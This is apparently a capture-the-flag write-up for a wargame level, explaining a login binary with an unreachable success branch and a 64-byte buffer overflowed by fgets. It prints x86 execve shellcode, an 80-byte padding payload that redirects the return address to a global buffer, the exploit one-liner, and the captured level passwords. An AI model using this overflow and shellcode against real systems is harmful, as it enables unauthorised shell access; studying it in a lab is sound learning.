# 💥 Level01 - Buffer Overflow + Logic Bug

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Classic buffer overflow meets impossible logic! Time to exploit both vulnerabilities!

## 📋 Binary Analysis

### 🔍 Decompiled Code

```c
char a_user_name[256];  // Global buffer at 0x0804a040

int verify_user_name(void)
{
    puts("verifying username....\n");
    return strncmp(a_user_name, "dat_wil", 7);
}

int verify_user_pass(char *password)
{
    return strncmp(password, "admin", 5);
}

int main(void)
{
    char password[64];
    int result;
    
    memset(password, 0, 64);
    result = 0;
    
    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    
    fgets(a_user_name, 0x100, stdin);  // 256 bytes - safe
    
    result = verify_user_name();
    
    if (result == 0) {
        puts("Enter Password: ");
        
        fgets(password, 100, stdin);  // ⚠️ 100 bytes into 64-byte buffer!
        
        result = verify_user_pass(password);
        
        // ⚠️ LOGIC BUG: This is ALWAYS TRUE!
        if ((result == 0) || (result != 0)) {
            puts("nope, incorrect password...\n");
            return 1;
        }
        else {
            return 0;  // Unreachable code!
        }
    }
    else {
        puts("nope, incorrect username...\n");
        return 1;
    }
}
```

### Key Observations

1. **Username Check**: Must start with `"dat_wil"` (7 characters)
2. **Password Check**: Compared against `"admin"` (5 characters)
3. **Logic Bug**: `(x == 0) || (x != 0)` is **always true** - legitimate authentication is impossible!
4. **Buffer Overflow**: `fgets()` reads 100 bytes into a 64-byte buffer
5. **Global Buffer**: `a_user_name` at fixed address `0x0804a040` - perfect for shellcode storage

## 🚨 Vulnerability

### The Problems

**Problem #1: Impossible Logic**
```c
if ((result == 0) || (result != 0)) {
    // This covers ALL possible integer values!
    // The success path is unreachable
}
```

**Problem #2: Buffer Overflow**
```c
char password[64];
fgets(password, 100, stdin);  // Reads 36 bytes too many!
```

### Stack Layout

```
High Memory
┌──────────────────────────────────┐
│ Return Address     [EBP + 4]     │ ← Target: overwrite this!
├──────────────────────────────────┤
│ Saved EBP          [EBP]         │
├──────────────────────────────────┤
│ Saved EDI          [EBP - 4]     │
├──────────────────────────────────┤
│ Saved EBX          [EBP - 8]     │
├──────────────────────────────────┤
│ ...                              │
├──────────────────────────────────┤
│ password[64]       [ESP + 0x1c]  │ ← Buffer starts here
└──────────────────────────────────┘
Low Memory

Offset to return address: 80 bytes
```

### Global Buffer Location

```
a_user_name: 0x0804a040 (256 bytes)

After "dat_wil" (7 bytes):
Shellcode starts at: 0x0804a047
```

## 🎯 The Attack

### Strategy

Since authentication is impossible due to the logic bug, we exploit the buffer overflow:

1. **Inject Shellcode** - Store in `a_user_name` global buffer
2. **Pass Username Check** - Start with `"dat_wil"` 
3. **Overflow Password** - Write 80 bytes of padding + shellcode address
4. **Hijack Control Flow** - Return address now points to our shellcode
5. **Execute Shell** - Shellcode runs with level02 privileges

### Shellcode Breakdown

We use a standard Linux x86 execve shellcode from [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428):

```nasm
; execve("/bin/sh", ["/bin/sh", NULL], NULL)
xor eax, eax        ; \x31\xc0
push eax            ; \x50              ; NULL terminator
push 0x68732f2f     ; \x68\x2f\x2f\x73\x68    ; "//sh"
push 0x6e69622f     ; \x68\x2f\x62\x69\x6e    ; "/bin"
mov ebx, esp        ; \x89\xe3          ; ebx = "/bin//sh"
push eax            ; \x50              ; NULL (argv[1])
push ebx            ; \x53              ; "/bin//sh" (argv[0])
mov ecx, esp        ; \x89\xe1          ; ecx = argv
mov al, 0x0b        ; \xb0\x0b          ; syscall 11 (execve)
int 0x80            ; \xcd\x80          ; Execute!
```

**Total: 21 bytes**

## 💣 Exploit

### Payload Construction

```python
# Username: "dat_wil" + shellcode
username = "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Password: 80 bytes padding + address of shellcode (0x0804a047)
password = "A" * 80 + "\x47\xa0\x04\x08"
```

### Execute

```bash
ssh level01@localhost -p 2222
# Password: uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

(python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c 'print "A"*80 + "\x47\xa0\x04\x08"'; cat) | ./level01
```

### Output

```
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

### Payload Breakdown

| Component | Size | Purpose |
|-----------|------|---------|
| `"dat_wil"` | 7 bytes | Pass username verification |
| Shellcode | 21 bytes | Execute `/bin/sh` when jumped to |
| Padding (`"A"*80`) | 80 bytes | Fill buffer to reach return address |
| `\x47\xa0\x04\x08` | 4 bytes | Overwrite return address with `0x0804a047` |

---

> 💡 **Pro Tip**: Always test your logic! `(x == 0) || (x != 0)` is a tautology - it's always true regardless of `x`. This is a classic copy-paste error or logical mistake in conditionals.

> 💡 **Security Note**: Global buffers at fixed addresses make shellcode injection trivial. Modern systems use ASLR (Address Space Layout Randomization) to prevent this. Also, NX (No-Execute) bits prevent executing code on the stack/data segments.

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

On to level02!
